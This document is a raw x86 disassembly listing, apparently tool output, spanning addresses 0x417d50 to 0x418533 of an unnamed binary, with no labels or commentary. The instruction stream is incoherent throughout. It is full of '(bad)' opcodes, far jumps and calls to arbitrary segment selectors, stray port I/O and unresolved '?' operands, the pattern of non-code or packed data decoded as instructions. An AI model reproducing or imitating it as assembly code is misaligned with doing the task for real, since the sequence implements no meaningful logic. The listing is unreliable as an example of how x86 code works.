  417d50:	daa    
  417d51:	pop    esi
  417d52:	cmp    ebx,DWORD PTR [esp+edx*1+0x8]
  417d56:	xchg   ecx,eax
  417d57:	hlt    
  417d58:	jns    0x417d31
  417d5a:	xchg   BYTE PTR [ebx-0x17],bl
  417d5d:	jmp    0x86e0:0xbf1c5ae5
  417d64:	mov    dl,0x4b
  417d66:	mov    edx,0xa3ebe6bf
  417d6b:	fs or  ecx,esp
  417d6e:	pop    edx
  417d6f:	stos   DWORD PTR es:[edi],eax
  417d70:	and    edi,0x51c42404
  417d76:	jo     0x417d71
  417d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d79:	cmp    esp,DWORD PTR [ebp-0x4a]
  417d7c:	mul    DWORD PTR [ebx]
  417d7e:	jg     0x417d9f
  417d80:	shl    DWORD PTR [eax-0x31],0x81
  417d84:	or     BYTE PTR [eax+0x274c69e5],dl
  417d8a:	(bad)  
  417d8b:	pop    ecx
  417d8c:	shl    BYTE PTR [ebp+0x3595fff5],0x13
  417d93:	mov    esi,0x43ba1446
  417d98:	and    BYTE PTR [esp+ebx*2+0x57],al
  417d9c:	sahf   
  417d9d:	ret    
  417d9e:	js     0x417e11
  417da0:	out    dx,al
  417da1:	sbb    al,0x18
  417da3:	and    ebx,DWORD PTR [eax-0x514844c4]
  417da9:	dec    ebp
  417daa:	and    DWORD PTR [ebp-0x5d9dcb7a],eax
  417db0:	fidiv  WORD PTR [ebx]
  417db2:	dec    edx
  417db3:	cmp    bl,dh
  417db5:	arpl   WORD PTR [edi],bp
  417db7:	inc    ebx
  417db8:	div    BYTE PTR [ecx]
  417dba:	lock jecxz 0x417dac
  417dbd:	fldcw  WORD PTR [ebp-0x1b]
  417dc0:	sub    dh,dl
  417dc2:	jmp    0x568c:0xdfb8c620
  417dc9:	retf   
  417dca:	mov    ecx,0x8fbecb19
  417dcf:	test   DWORD PTR [edi+0x72f75111],0x8f2b828a
  417dd9:	out    dx,al
  417dda:	and    cl,BYTE PTR [eax-0x10]
  417ddd:	cwde   
  417dde:	pop    ds
  417ddf:	(bad)  
  417de0:	mov    bl,0x71
  417de2:	cmp    al,BYTE PTR [edi-0x1abb6ad1]
  417de8:	jb     0x417d80
  417dea:	and    ebx,DWORD PTR [edx]
  417dec:	inc    ecx
  417ded:	pop    esi
  417dee:	pop    es
  417def:	mov    edi,0x7e272661
  417df4:	daa    
  417df5:	call   0x5942:0x769deffd
  417dfc:	ins    BYTE PTR es:[edi],dx
  417dfd:	mov    bh,0x99
  417dff:	fbstp  TBYTE PTR [ebx]
  417e01:	sub    al,0x17
  417e03:	add    al,0xfb
  417e05:	mov    dl,0x8
  417e07:	adc    ecx,DWORD PTR [edi-0x6ec57126]
  417e0d:	out    dx,al
  417e0e:	dec    ebp
  417e0f:	dec    edi
  417e10:	jo     0x417e5b
  417e12:	inc    edi
  417e13:	mov    ds:0x23b6a4b3,eax
  417e18:	and    edx,DWORD PTR [esi]
  417e1a:	push   eax
  417e1b:	mov    WORD PTR [eax],es
  417e1d:	lea    esi,[edx-0x7b]
  417e20:	repnz push es
  417e22:	sbb    eax,0xfa12596f
  417e27:	mov    ss,edx
  417e29:	es add bh,dl
  417e2c:	and    eax,0x3a06822e
  417e31:	cs test al,0x61
  417e34:	pop    ecx
  417e35:	sub    ebp,0x15e3311d
  417e3b:	lds    eax,FWORD PTR [ebp-0x32]
  417e3e:	add    BYTE PTR [ebp+0x49],dl
  417e41:	out    dx,eax
  417e42:	sbb    ah,bh
  417e44:	add    bh,BYTE PTR [ecx-0x571c3ef0]
  417e4a:	xchg   ebp,eax
  417e4b:	pop    esi
  417e4c:	js     0x417eb6
  417e4e:	cmc    
  417e4f:	xor    ebx,DWORD PTR ds:0x1d4700ef
  417e55:	aad    0xd4
  417e57:	cdq    
  417e58:	cmp    eax,0xf5af1dd8
  417e5d:	push   edx
  417e5e:	xor    DWORD PTR gs:[eax+0x2f],0xead1c400
  417e66:	jae    0x417e63
  417e68:	lock inc ecx
  417e6a:	fcomp  DWORD PTR [eax]
  417e6c:	mov    ebp,0x6b2e6ad2
  417e71:	rcr    BYTE PTR [ecx+eax*2],1
  417e74:	inc    edi
  417e75:	stc    
  417e76:	bound  edi,QWORD PTR [ebx-0x76]
  417e79:	mov    ch,0x76
  417e7b:	push   edx
  417e7c:	stos   DWORD PTR es:[edi],eax
  417e7d:	sub    eax,0x9abf29e
  417e82:	cmc    
  417e83:	(bad)  
  417e86:	cmp    BYTE PTR [edx+eiz*8-0x57],ah
  417e8a:	push   ebx
  417e8b:	in     eax,dx
  417e8c:	lods   al,BYTE PTR ds:[esi]
  417e8d:	sub    ebx,DWORD PTR [edx]
  417e8f:	jnp    0x417e9e
  417e91:	xchg   esi,eax
  417e92:	pop    edx
  417e93:	and    BYTE PTR [eax+0x2b],al
  417e96:	sbb    al,0x88
  417e98:	or     ah,BYTE PTR [ebp+0x7e]
  417e9b:	jbe    0x417e51
  417e9d:	mov    eax,ds:0x736a867
  417ea2:	or     BYTE PTR ss:[ebp-0x516e5e39],dl
  417ea9:	outs   dx,DWORD PTR ds:[esi]
  417eaa:	jmp    0xb7e1:0x732b684a
  417eb1:	and    edi,esp
  417eb3:	es call 0x1adf:0x4187d4cd
  417ebb:	repz retf 0x1efb
  417ebf:	das    
  417ec0:	push   ds
  417ec1:	sub    eax,0xe2615819
  417ec6:	mov    al,0x29
  417ec8:	add    DWORD PTR gs:[bp+si-0x7d],eax
  417ecd:	pushf  
  417ece:	ja     0x417e51
  417ed0:	(bad)  
  417ed1:	mov    dh,0xc
  417ed3:	dec    eax
  417ed4:	ret    0x5aee
  417ed7:	retf   0xfd5c
  417eda:	cmp    BYTE PTR ds:0xe4b0ddec,ch
  417ee0:	sar    BYTE PTR [ecx-0x7f],0x9a
  417ee4:	pop    ss
  417ee5:	mov    esi,0x310d1ad
  417eea:	mov    ebx,0xe195a406
  417eef:	pop    edx
  417ef0:	push   esp
  417ef1:	dec    ebp
  417ef2:	jp     0x417ee3
  417ef4:	outs   dx,DWORD PTR ds:[esi]
  417ef5:	aaa    
  417ef6:	stos   BYTE PTR es:[edi],al
  417ef7:	js     0x417e9d
  417ef9:	xchg   edx,eax
  417efa:	mov    dl,0x79
  417efc:	int3   
  417efd:	mov    esp,0x76eb162d
  417f02:	inc    ebx
  417f03:	lods   eax,DWORD PTR ds:[esi]
  417f04:	iret   
  417f05:	data16 test dh,dh
  417f08:	jb     0x417ead
  417f0a:	jae    0x417e8f
  417f0c:	pop    ds
  417f0d:	cdq    
  417f0e:	adc    al,0x7c
  417f10:	inc    edx
  417f11:	sbb    DWORD PTR [ebx+ebx*4],ebx
  417f14:	fwait
  417f15:	push   0x6f
  417f17:	inc    esp
  417f18:	pop    esi
  417f19:	fnstenv [ecx+esi*8-0x6679b38f]
  417f20:	sbb    edx,0xb203477e
  417f26:	daa    
  417f27:	(bad)  
  417f28:	addr16 repnz sub al,0x36
  417f2c:	jecxz  0x417f1c
  417f2e:	and    ah,BYTE PTR [esp+ebx*1]
  417f31:	test   al,0xb0
  417f33:	xchg   esp,eax
  417f34:	dec    ebp
  417f35:	lahf   
  417f36:	cmp    DWORD PTR [edx],ebp
  417f38:	push   eax
  417f39:	pop    ebp
  417f3a:	imul   BYTE PTR [ebx]
  417f3c:	es mov esi,es
  417f3f:	inc    esi
  417f40:	mul    DWORD PTR [esi]
  417f42:	test   ebp,eax
  417f44:	cmp    BYTE PTR [ebx],bh
  417f46:	jb     0x417edd
  417f48:	ret    0xff4a
  417f4b:	pop    edx
  417f4c:	(bad)  
  417f4d:	(bad)  
  417f4e:	mov    eax,ds:0x8a1d6bc5
  417f53:	repz and bh,BYTE PTR [edi-0x53]
  417f57:	int    0x90
  417f59:	inc    ecx
  417f5a:	mov    ch,0xb6
  417f5c:	push   esi
  417f5d:	ret    
  417f5e:	and    al,0xb3
  417f60:	loop   0x417f0e
  417f62:	(bad)  
  417f63:	mov    al,0x1c
  417f65:	and    al,0x8
  417f67:	adc    BYTE PTR [esp+ebx*2-0x3f4189f4],cl
  417f6e:	xchg   edi,eax
  417f6f:	pop    esi
  417f70:	int3   
  417f71:	pop    ecx
  417f72:	sub    DWORD PTR [ebx+0x3d],edi
  417f75:	mov    edi,0xa8e41c25
  417f7a:	jge    0x417fef
  417f7c:	mov    ebx,0xcd934aa4
  417f81:	out    dx,al
  417f82:	jmp    0x29282954
  417f87:	push   ecx
  417f88:	test   DWORD PTR [ecx-0x3768e754],edx
  417f8e:	add    cl,BYTE PTR [ecx+eax*2-0x43]
  417f92:	lahf   
  417f93:	in     al,0xdd
  417f95:	test   DWORD PTR [ecx-0x7],ecx
  417f98:	adc    esi,esi
  417f9a:	leave  
  417f9b:	mov    ds:0xbe68f603,al
  417fa0:	push   ebp
  417fa1:	add    eax,0x9a45485
  417fa6:	ins    DWORD PTR es:[edi],dx
  417fa7:	adc    DWORD PTR [ecx-0x26e363ae],esi
  417fad:	add    al,0xa
  417faf:	xor    edx,ebp
  417fb1:	lea    esi,[esi]
  417fb3:	out    dx,al
  417fb4:	xchg   DWORD PTR [ebx+ebp*8-0x34803519],ebx
  417fbb:	push   ds
  417fbc:	retf   0xb351
  417fbf:	fwait
  417fc0:	cmc    
  417fc1:	jge    0x41801a
  417fc3:	div    dh
  417fc5:	out    dx,al
  417fc6:	gs popf 
  417fc8:	or     BYTE PTR [edx+ebp*4-0x7b],ch
  417fcc:	popa   
  417fcd:	shl    BYTE PTR [edx+0x25],cl
  417fd0:	sub    al,BYTE PTR [eax-0x50]
  417fd3:	add    eax,0xb36fcca8
  417fd8:	and    DWORD PTR [edi+ecx*2],0x51
  417fdc:	sbb    ecx,DWORD PTR [edx-0x4ee9874a]
  417fe2:	arpl   bx,ax
  417fe4:	xor    ah,ch
  417fe6:	(bad)  
  417fe7:	cmp    ecx,DWORD PTR [eax-0x44790613]
  417fed:	push   ebx
  417fee:	int    0x24
  417ff0:	push   0x36e59466
  417ff5:	push   ss
  417ff6:	out    0xc0,eax
  417ff8:	and    eax,DWORD PTR [eax+eax*1+0x0]
  417ffc:	in     eax,0xda
  417ffe:	out    0x2,al
  418000:	adc    eax,0x8ffa3e9b
  418005:	punpckhdq mm3,mm1
  418008:	aam    0x3
  41800a:	stc    
  41800b:	fprem  
  41800d:	jb     0x417fd4
  41800f:	mov    esi,0x7ac636ae
  418014:	scas   al,BYTE PTR es:[edi]
  418015:	fld    st(0)
  418017:	xor    esi,ecx
  418019:	je     0x418054
  41801b:	inc    esi
  41801c:	and    eax,0x6c06e828
  418021:	push   ds
  418022:	xor    al,0xfd
  418024:	cmp    al,BYTE PTR [esi-0x2a258445]
  41802a:	das    
  41802b:	addr16 jb 0x418047
  41802e:	shl    edx,0x24
  418031:	std    
  418032:	js     0x417fd8
  418034:	mov    edi,0xdcc15bfe
  418039:	push   esp
  41803a:	add    ch,BYTE PTR [edx]
  41803c:	jno    0x417ffa
  41803e:	xchg   ecx,eax
  41803f:	ret    
  418040:	cmc    
  418041:	push   ebx
  418042:	xchg   ebp,eax
  418043:	ds dec esi
  418045:	xor    edx,DWORD PTR [edi-0x4f]
  418048:	and    al,0xf8
  41804a:	or     DWORD PTR [edi],ecx
  41804c:	and    ch,0x67
  41804f:	aam    0x22
  418051:	fmul   DWORD PTR [eax-0x5b]
  418054:	fnstsw WORD PTR [eax]
  418056:	dec    ecx
  418057:	xchg   esi,eax
  418058:	ror    dh,cl
  41805a:	setp   bl
  41805d:	inc    edi
  41805e:	jne    0x4180b8
  418060:	mov    ecx,0xc6efcff1
  418065:	(bad)  
  418066:	xchg   esp,eax
  418067:	jecxz  0x417ff5
  418069:	mov    esp,DWORD PTR [edx]
  41806b:	xor    dl,dl
  41806d:	mov    ecx,0x430b2854
  418072:	xchg   esp,eax
  418073:	cmp    DWORD PTR [ebp+ebx*8-0x2b41b3e6],ecx
  41807a:	in     eax,dx
  41807b:	push   eax
  41807c:	pop    ss
  41807d:	cmp    cl,BYTE PTR [esi]
  41807f:	fdivr  st,st(7)
  418081:	push   0x23fa93a6
  418086:	imul   esi,DWORD PTR [edi],0x65
  418089:	dec    esp
  41808a:	cmp    BYTE PTR [ebx],0x65
  41808d:	sub    ah,dh
  41808f:	shr    BYTE PTR [ecx-0x6],cl
  418092:	add    BYTE PTR [eax-0x4a],cl
  418095:	dec    eax
  418096:	mov    ebp,0xd74f1c6a
  41809b:	ror    DWORD PTR [edx],0x19
  41809e:	inc    edx
  41809f:	mov    fs,edx
  4180a1:	(bad)  
  4180a2:	hlt    
  4180a3:	scas   eax,DWORD PTR es:[edi]
  4180a4:	fs sahf 
  4180a6:	push   cs
  4180a7:	add    al,0xbc
  4180a9:	add    BYTE PTR [ebp+0x2f],ah
  4180ac:	inc    esp
  4180ad:	stc    
  4180ae:	add    dh,BYTE PTR [ecx]
  4180b0:	mov    esp,0x28dde022
  4180b5:	mov    DWORD PTR [ecx+0x79],eax
  4180b8:	mov    ah,0x72
  4180ba:	lock fwait
  4180bc:	and    BYTE PTR [esi-0x43],cl
  4180bf:	push   edi
  4180c0:	js     0x418086
  4180c2:	cli    
  4180c3:	mov    cl,0x2a
  4180c5:	add    al,0x9
  4180c7:	test   DWORD PTR [esi+edx*2-0x48900e1b],ebp
  4180ce:	imul   ebp,DWORD PTR [eax+ebp*2],0x4a7e7ab9
  4180d5:	ret    
  4180d6:	stc    
  4180d7:	(bad)  
  4180d8:	dec    esi
  4180d9:	push   ebx
  4180da:	sbb    cl,ch
  4180dc:	mov    edx,ebx
  4180de:	and    ebp,DWORD PTR [ecx+eiz*4-0x7e]
  4180e2:	sbb    bl,cl
  4180e4:	add    edx,esp
  4180e6:	or     DWORD PTR [ebx-0x58bee79a],ebx
  4180ec:	inc    esi
  4180ed:	arpl   WORD PTR [ecx-0x21],ax
  4180f0:	(bad)  [edx-0x5c722e39]
  4180f6:	enter  0x241d,0xd7
  4180fa:	cld    
  4180fb:	sub    ch,BYTE PTR [eax]
  4180fd:	shl    esi,0xc8
  418100:	mov    bh,0xb9
  418102:	jp     0x4180e5
  418104:	aam    0x9f
  418106:	sar    BYTE PTR [esp+ebp*8],1
  418109:	jo     0x418163
  41810b:	pop    ecx
  41810c:	call   0x394d:0xc9c4f9e9
  418113:	mov    ds:0x1bcf479e,al
  418118:	stos   BYTE PTR es:[edi],al
  418119:	mov    edx,0xb5b94e1e
  41811e:	aam    0x38
  418120:	in     eax,dx
  418121:	cmp    dl,BYTE PTR [ebx+0x5f870e7b]
  418127:	in     al,0xe8
  418129:	cmp    al,BYTE PTR [ebp-0x36]
  41812c:	hlt    
  41812d:	pop    eax
  41812e:	addr16 mov ecx,0x9e173070
  418134:	sbb    ebp,DWORD PTR [ebp+0x11]
  418137:	hlt    
  418138:	xor    DWORD PTR ds:0x7d17d9a4,ebp
  41813e:	sbb    DWORD PTR [esi+eiz*1-0x2c],edx
  418142:	mov    al,0x3e
  418144:	push   cs
  418145:	adc    eax,0x4f893fa0
  41814a:	(bad)  
  41814c:	sub    BYTE PTR [ecx-0xa8b300e],bl
  418152:	pop    ebx
  418153:	adc    ch,bl
  418155:	mov    eax,0x60039c5c
  41815a:	sub    al,0xb5
  41815c:	js     0x4181c0
  41815e:	icebp  
  41815f:	repz std 
  418161:	mov    edx,DWORD PTR [eax-0x2d]
  418164:	mov    bh,BYTE PTR [edi]
  418166:	and    eax,0x1573af6e
  41816b:	fdiv   DWORD PTR [edx-0x3e]
  41816e:	mov    dh,BYTE PTR [esi+0x7e8b97f3]
  418174:	ins    BYTE PTR es:[edi],dx
  418175:	enter  0xdb21,0x16
  418179:	std    
  41817a:	jp     0x41813c
  41817c:	mov    bh,0x2e
  41817e:	inc    edx
  41817f:	leave  
  418180:	aam    0x3d
  418182:	pushf  
  418183:	cdq    
  418184:	ins    DWORD PTR es:[edi],dx
  418185:	mov    al,ds:0xa8fa9de5
  41818a:	popf   
  41818b:	fwait
  41818c:	clc    
  41818d:	iret   
  41818e:	mov    cl,0x1c
  418190:	(bad)  
  418191:	imul   ebx,DWORD PTR [ebx+0x62c3ef70],0x53
  418198:	xchg   ebp,edi
  41819a:	or     al,0xb1
  41819c:	in     al,0xd1
  41819e:	sub    eax,0x9c4d5c96
  4181a3:	pop    edx
  4181a4:	jnp    0x418209
  4181a6:	xor    DWORD PTR [esi-0x2b217623],ebp
  4181ac:	jmp    0x418226
  4181ae:	lock adc BYTE PTR [esi],0x6b
  4181b2:	sub    esp,esi
  4181b4:	retf   
  4181b5:	sbb    al,0xeb
  4181b7:	sbb    ah,bh
  4181b9:	retf   0xd740
  4181bc:	cmp    edx,ecx
  4181be:	cmc    
  4181bf:	loopne 0x4181e7
  4181c1:	or     edx,DWORD PTR [eax-0x75]
  4181c4:	mov    esi,ebp
  4181c6:	inc    eax
  4181c7:	xor    al,0x3a
  4181c9:	mov    dl,0x59
  4181cb:	ja     0x418196
  4181cd:	fstp   DWORD PTR [ebx+0x4cf0cc35]
  4181d3:	scas   al,BYTE PTR es:[edi]
  4181d4:	and    DWORD PTR [ebx-0x4add6768],0xffffffcf
  4181db:	push   esi
  4181dc:	fidivr WORD PTR [esp+eax*1-0x41188904]
  4181e3:	push   0x1e609407
  4181e8:	jne    0x41816a
  4181ea:	scas   eax,DWORD PTR es:[edi]
  4181eb:	adc    DWORD PTR cs:[edi],esp
  4181ee:	jns    0x418213
  4181f0:	jge    0x418236
  4181f2:	out    0xa2,eax
  4181f4:	bound  esi,QWORD PTR [edi*1-0x6379076e]
  4181fb:	mov    ds:0x70f5a17d,al
  418200:	cmp    BYTE PTR [esi],0x61
  418203:	sub    eax,0xde338a06
  418208:	mov    dl,dh
  41820a:	jae    0x4181be
  41820c:	sub    esi,DWORD PTR [edx-0x4d547b6d]
  418212:	mov    esp,0xa36270d8
  418217:	dec    edi
  418218:	icebp  
  418219:	iret   
  41821a:	mov    DWORD PTR [edi],ebp
  41821c:	pop    esi
  41821d:	div    BYTE PTR [ebp+0x72]
  418220:	repz int 0xcb
  418223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418224:	and    al,0x13
  418226:	aad    0x66
  418228:	retf   0xa2d5
  41822b:	out    0xca,eax
  41822d:	add    esi,esi
  41822f:	dec    ecx
  418230:	adc    BYTE PTR [ecx],dh
  418232:	and    BYTE PTR [eax-0x9],bl
  418235:	ret    
  418236:	sahf   
  418237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418238:	inc    ebp
  418239:	sub    edi,ebp
  41823b:	call   0xf4c6:0xd50a7031
  418242:	icebp  
  418243:	shr    esp,cl
  418245:	mov    ds:0xdf88fd25,eax
  41824a:	xchg   edi,eax
  41824b:	in     eax,0x54
  41824d:	lods   al,BYTE PTR ds:[esi]
  41824e:	pop    esi
  41824f:	sub    al,0x51
  418251:	adc    ebp,DWORD PTR [esp+ebp*8-0x37]
  418255:	sbb    eax,0x99305461
  41825a:	sub    DWORD PTR ds:0x3f893fa0,ebx
  418260:	pop    ebp
  418261:	lock div BYTE PTR [ebx+esi*4-0x51]
  418266:	sub    al,BYTE PTR [eax+esi*1]
  418269:	ins    DWORD PTR es:[edi],dx
  41826a:	xchg   edx,eax
  41826b:	scas   eax,DWORD PTR es:[edi]
  41826c:	cli    
  41826d:	sbb    dh,BYTE PTR [edi+esi*4]
  418270:	xchg   esi,eax
  418271:	adc    DWORD PTR [eax-0x29],esp
  418274:	lods   al,BYTE PTR ds:[esi]
  418275:	fs xor cl,al
  418278:	icebp  
  418279:	clc    
  41827a:	lods   eax,DWORD PTR ds:[esi]
  41827b:	adc    DWORD PTR [ebx],edi
  41827d:	adc    BYTE PTR [ebp+0x5b],0x96
  418281:	cld    
  418282:	jg     0x418250
  418284:	cld    
  418285:	and    eax,0xfacf2e90
  41828a:	jne    0x4182cc
  41828c:	jge    0x41829f
  41828e:	outs   dx,BYTE PTR ds:[esi]
  41828f:	jle    0x418264
  418291:	jb     0x418259
  418293:	cli    
  418294:	mov    DWORD PTR [edx+0x7f],edi
  418297:	sbb    al,0xfc
  418299:	in     al,0x5
  41829b:	aas    
  41829c:	ret    0xb56f
  41829f:	push   edx
  4182a0:	mov    WORD PTR [ebx+0x109c7c9b],ds
  4182a6:	pusha  
  4182a7:	cmp    al,0x18
  4182a9:	dec    di
  4182ab:	push   edi
  4182ac:	(bad)  
  4182ad:	inc    eax
  4182ae:	cmc    
  4182af:	sti    
  4182b0:	scas   al,BYTE PTR es:[edi]
  4182b1:	dec    edi
  4182b2:	xchg   ecx,eax
  4182b3:	repnz imul edi,DWORD PTR [eax],0x32938960
  4182ba:	xchg   esp,eax
  4182bb:	jo     0x418246
  4182bd:	and    eax,0x24b611e9
  4182c2:	sar    eax,cl
  4182c4:	ja     0x418327
  4182c6:	jnp    0x418260
  4182c8:	add    al,0x4d
  4182ca:	xor    esi,eax
  4182cc:	or     BYTE PTR [esi+eiz*2+0x5781ded9],al
  4182d3:	pop    ds
  4182d4:	pushf  
  4182d5:	fwait
  4182d6:	push   es
  4182d7:	imul   ebx,DWORD PTR [ebx-0x579656fc],0xffffffc2
  4182de:	xchg   ebx,eax
  4182df:	adc    eax,0xb340f627
  4182e4:	xchg   ebp,eax
  4182e5:	out    dx,eax
  4182e6:	pop    ds
  4182e7:	jle    0x41833c
  4182e9:	mov    eax,0x6d92e35d
  4182ee:	push   0xffffffb8
  4182f0:	mov    ds:0xb690184a,al
  4182f5:	ret    
  4182f6:	and    eax,ebp
  4182f8:	and    dl,dh
  4182fa:	mov    al,ds:0xd0572ce1
  4182ff:	pop    ss
  418300:	jle    0x41833c
  418302:	ficom  WORD PTR [esp+ebp*1+0x2cb861c2]
  418309:	jl     0x418388
  41830b:	jecxz  0x4182a4
  41830d:	mov    ebp,0xc234f0fb
  418312:	enter  0x567b,0xc2
  418316:	fsubr  st(0),st
  418318:	jge    0x4182ee
  41831a:	in     al,0xb1
  41831c:	mov    ds:0x634cafd3,al
  418321:	push   ebp
  418322:	sbb    al,0x65
  418324:	fnop   
  418326:	retf   
  418327:	jg     0x418395
  418329:	mov    edi,edx
  41832b:	ss loope 0x4182c6
  41832e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41832f:	push   0x90f13ac4
  418334:	lock jmp 0x4aa0:0xba6e6aa3
  41833c:	sti    
  41833d:	rcr    DWORD PTR [ebp+eax*1-0xde59692],1
  418344:	nop
  418345:	mov    ah,0xfb
  418347:	push   ebp
  418348:	js     0x41839e
  41834a:	repnz pop edx
  41834c:	jge    0x418362
  41834e:	inc    edi
  41834f:	js     0x418319
  418351:	pop    edi
  418352:	jle    0x4182e4
  418354:	add    al,0xdf
  418356:	sbb    eax,0x9cc9840e
  41835b:	mov    al,bl
  41835d:	les    esi,FWORD PTR [ebx+0x1f08b1b6]
  418363:	popa   
  418364:	enter  0x48bd,0xc0
  418368:	mov    ?,WORD PTR [edx]
  41836a:	mov    ds:0x68146cb7,al
  41836f:	das    
  418370:	inc    eax
  418371:	push   ss
  418372:	dec    edx
  418373:	mov    ecx,0x5f0f802c
  418378:	in     eax,0x77
  41837a:	adc    DWORD PTR [edx],edx
  41837c:	fist   DWORD PTR [ecx]
  41837e:	jle    0x4183ab
  418380:	mov    bl,0x95
  418382:	push   es
  418383:	into   
  418384:	imul   ebx,DWORD PTR [esi+0x18],0x1fc8bec4
  41838b:	dec    edx
  41838c:	cmp    al,cl
  41838e:	pop    esp
  41838f:	cdq    
  418390:	jl     0x418404
  418392:	xor    al,0xfe
  418394:	adc    BYTE PTR [ebp-0x11],dh
  418397:	cmc    
  418398:	cmp    BYTE PTR [edi+edi*4-0x1f881b3],0xdc
  4183a0:	daa    
  4183a1:	lods   al,BYTE PTR ds:[esi]
  4183a2:	inc    edx
  4183a3:	(bad)  
  4183a5:	dec    ebp
  4183a6:	or     al,0x4a
  4183a8:	mov    eax,ds:0x9010529
  4183ad:	mov    al,0x66
  4183af:	arpl   cx,bp
  4183b1:	fsubr  QWORD PTR cs:[ebx]
  4183b4:	loope  0x4183c7
  4183b6:	add    BYTE PTR [edx],ah
  4183b8:	xlat   BYTE PTR ds:[ebx]
  4183b9:	scas   eax,DWORD PTR es:[edi]
  4183ba:	fst    QWORD PTR [eax-0x6e]
  4183bd:	leave  
  4183be:	xor    eax,0x37142daa
  4183c3:	mov    cl,0x28
  4183c5:	out    0x5c,al
  4183c7:	rol    DWORD PTR [ebx-0x1ce2caf2],1
  4183cd:	outs   dx,DWORD PTR ds:[esi]
  4183ce:	mov    cl,0x2
  4183d0:	sahf   
  4183d1:	or     eax,0xca3db903
  4183d6:	or     dl,al
  4183d8:	jmp    0x4183ef
  4183da:	mov    edi,0x1700864b
  4183df:	pop    es
  4183e0:	leave  
  4183e1:	xor    DWORD PTR [ebp-0x30],esi
  4183e4:	scas   eax,DWORD PTR es:[edi]
  4183e5:	rcr    DWORD PTR [ebx],cl
  4183e7:	int3   
  4183e8:	addr16 pop eax
  4183ea:	pusha  
  4183eb:	lea    edi,[ebx+ecx*8-0x63]
  4183ef:	jecxz  0x4183b7
  4183f1:	lods   al,BYTE PTR ds:[esi]
  4183f2:	mov    BYTE PTR [eax+0x42],ch
  4183f5:	in     al,dx
  4183f6:	mov    WORD PTR [edi],?
  4183f8:	test   BYTE PTR cs:[eax+esi*8],dl
  4183fc:	dec    ebp
  4183fd:	mov    esi,0x8678e79d
  418402:	aaa    
  418403:	xchg   edi,eax
  418404:	mov    ah,0x67
  418406:	pop    ecx
  418407:	cmp    DWORD PTR [edi],eax
  418409:	aaa    
  41840a:	and    bl,BYTE PTR [ebx-0x31]
  41840d:	mov    WORD PTR [ebp-0x16d9a2e3],?
  418413:	aaa    
  418414:	in     eax,dx
  418415:	push   es
  418416:	(bad)  
  418417:	icebp  
  418418:	inc    ebp
  418419:	imul   esp,DWORD PTR [esi+eiz*2-0x5cc92829],0xeb895d52
  418424:	rol    ch,cl
  418426:	sar    DWORD PTR [ecx],1
  418428:	cmp    eax,0xba7158b
  41842d:	icebp  
  41842e:	jne    0x418463
  418430:	or     eax,0xbcb6409d
  418435:	fisub  DWORD PTR [esi-0x76]
  418438:	fs pop ecx
  41843a:	cmc    
  41843b:	rol    BYTE PTR [esi+eiz*1-0x4dff3069],cl
  418442:	inc    ebx
  418443:	(bad)  
  418444:	push   esp
  418445:	pop    ebx
  418446:	test   DWORD PTR [esi],ebx
  418448:	xor    BYTE PTR [edi+edx*2-0x43],0xd9
  41844d:	fwait
  41844e:	sbb    ebx,ebp
  418450:	sub    bl,0x2
  418453:	mov    ebx,0xaeceef56
  418458:	jg     0x4184a8
  41845a:	mov    ch,0x46
  41845c:	mov    edx,0xff311253
  418461:	sti    
  418462:	push   edx
  418463:	les    ebp,FWORD PTR [edi+0x419901dc]
  418469:	out    dx,eax
  41846a:	pop    edx
  41846b:	dec    esp
  41846c:	mov    dl,0x6b
  41846e:	cld    
  41846f:	push   ebx
  418470:	imul   ebp,esi,0x37f18208
  418476:	into   
  418477:	xchg   edi,eax
  418478:	mov    ecx,0x33531ea9
  41847d:	jle    0x41843b
  41847f:	imul   DWORD PTR [ebx+eiz*8]
  418482:	xchg   esp,eax
  418483:	stos   BYTE PTR es:[edi],al
  418484:	cmp    cl,bh
  418486:	ins    DWORD PTR es:[edi],dx
  418487:	enter  0x2483,0xd2
  41848b:	outs   dx,DWORD PTR ds:[esi]
  41848c:	push   ecx
  41848d:	jg     0x4184da
  41848f:	add    bh,dl
  418491:	jmp    0xfc83:0x7cb3146f
  418498:	push   esp
  418499:	fwait
  41849a:	cmp    BYTE PTR [eax+edi*4],dh
  41849d:	adc    BYTE PTR [eax],cl
  41849f:	daa    
  4184a0:	jo     0x418519
  4184a2:	dec    BYTE PTR [ecx]
  4184a4:	pop    esp
  4184a5:	xor    DWORD PTR [esi+0x31935197],esp
  4184ab:	push   edx
  4184ac:	cwde   
  4184ad:	sar    dh,0x1b
  4184b0:	xor    BYTE PTR [ebp+ebx*2+0x40afdc1c],0x9
  4184b8:	sub    ecx,DWORD PTR ds:0x9f0e7791
  4184be:	jae    0x418457
  4184c0:	jbe    0x4184fe
  4184c2:	or     dl,BYTE PTR [esi-0x6f]
  4184c5:	scas   eax,DWORD PTR es:[edi]
  4184c6:	cdq    
  4184c7:	add    dh,BYTE PTR [ecx+0x6e]
  4184ca:	int    0x69
  4184cc:	leave  
  4184cd:	cmp    BYTE PTR [ecx+0x4e],bh
  4184d0:	out    dx,eax
  4184d1:	cmp    dh,0x2a
  4184d4:	add    DWORD PTR [edx],ecx
  4184d6:	leave  
  4184d7:	inc    eax
  4184d8:	call   0xfddd:0xfda20a9e
  4184df:	enter  0xae70,0x5c
  4184e3:	iret   
  4184e4:	out    dx,al
  4184e5:	mov    eax,0xa998d9da
  4184ea:	loopne 0x41851c
  4184ec:	stc    
  4184ed:	retf   
  4184ee:	inc    esp
  4184ef:	push   edi
  4184f0:	xchg   BYTE PTR [ecx-0x34],bh
  4184f3:	sub    DWORD PTR [ebx-0x70],edx
  4184f6:	test   eax,0xde3df2f9
  4184fb:	hlt    
  4184fc:	add    eax,0xe73fdfb1
  418501:	add    al,0x57
  418503:	jmp    0x5d64:0x5959a78b
  41850a:	sbb    ecx,eax
  41850c:	sub    eax,0x349efc4e
  418511:	lods   eax,DWORD PTR ds:[esi]
  418512:	push   0x36
  418514:	and    edx,eax
  418516:	pop    eax
  418517:	int    0x5a
  418519:	pop    es
  41851a:	repz xor BYTE PTR [ecx+edi*8-0x79ab0a63],al
  418522:	mov    al,ds:0xdfbaa224
  418527:	mov    ?,WORD PTR [esp+edi*8-0x65]
  41852b:	dec    ebp
  41852c:	mov    bl,0xae
  41852e:	cmp    eax,0x75c0806e
  418533:	sbb    DWORD PTR [esp+esi*2],eax
